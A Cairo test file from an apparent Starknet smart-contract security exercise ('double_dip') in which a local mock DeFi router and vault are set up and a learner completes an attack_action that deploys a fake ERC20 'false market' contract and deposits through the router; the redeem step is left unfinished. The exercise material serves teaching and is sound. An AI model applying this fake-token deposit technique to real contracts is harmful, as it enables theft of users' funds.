#[cfg(test)]
mod TestDoubleDip {
    use core::debug::PrintTrait;
    use core::result::ResultTrait;
    use core::option::OptionTrait;
    use core::traits::TryInto;
    use starknet::{contract_address_to_felt252, ContractAddress};
    use snforge_std::{
        declare, ContractClass, ContractClassTrait, start_prank, stop_prank, CheatTarget
    };
    use pharaonik::interfaces::IERC20Camel::{
        IERC20CamelSafeDispatcher, IERC20CamelSafeDispatcherTrait
    };
    use pharaonik::interfaces::ISubDefiRouter::{
        ISubDefiRouterSafeDispatcher, ISubDefiRouterSafeDispatcherTrait
    };
    use pharaonik::interfaces::ISubDefiVault::{
        ISubDefiVaultSafeDispatcher, ISubDefiVaultSafeDispatcherTrait
    };
    use pharaonik::excercises::excercise0::double_dip::attack::{
        IAttackSafeDispatcher, IAttackSafeDispatcherTrait
    };
    use pharaonik::utils::constants::Constants;
    use pharaonik::utils::errors::Errors;
    use pharaonik::setup::setup::Setup::{declare_contract, deploy_contract, fund_tokens};
    use pharaonik::setup::setup_double_dip::SetupDoubleDip::{setup_double_dip};

    #[test]
    #[feature("safe_dispatcher")]
    fn test_exploit() {
        let (wETH_address, router_address, eth_vault_address) = setup_double_dip();
        let wETH = IERC20CamelSafeDispatcher { contract_address: wETH_address };
        let SubDefiRouter = ISubDefiRouterSafeDispatcher { contract_address: router_address };
        let SubDefiEthVault = ISubDefiVaultSafeDispatcher { contract_address: eth_vault_address };
        let sub_defi_admin = Constants::sub_defi_admin();

        start_prank(CheatTarget::One(router_address), sub_defi_admin);
        SubDefiRouter.add_market(wETH_address, eth_vault_address).unwrap();
        stop_prank(CheatTarget::One(router_address));

        start_prank(CheatTarget::One(eth_vault_address), sub_defi_admin);
        SubDefiEthVault.update_rate(1000000000000000000).unwrap();
        stop_prank(CheatTarget::One(eth_vault_address));

        attack_action(router_address, wETH_address);
        'Excerise Completed!'.print();
    }

    // Complete the below function 
    fn attack_action(router: ContractAddress, wETH: ContractAddress) {
        let deposit_amount: u256 = 5000000000000000000; // 5 ETH 
        let attacker = Constants::attacker();
        let Router = ISubDefiRouterSafeDispatcher { contract_address: router };
        let market_id: u32 = 0;

        // Deploy false wETH Market contract
        let mut call_data = ArrayTrait::new();
        call_data.append(contract_address_to_felt252(attacker));
        let false_market_class: ContractClass = declare_contract('FalseERC20');
        let false_market_address: ContractAddress = deploy_contract(false_market_class, call_data);

        IERC20CamelSafeDispatcher { contract_address: wETH }
            .transfer(false_market_address, deposit_amount);

        // Deposit
        start_prank(CheatTarget::One(router), attacker);
        let deposit_id: u8 = Router
            .deposit_request(market_id, false_market_address, deposit_amount)
            .unwrap();
        stop_prank(CheatTarget::One(router));
    // Redeem
    }
}

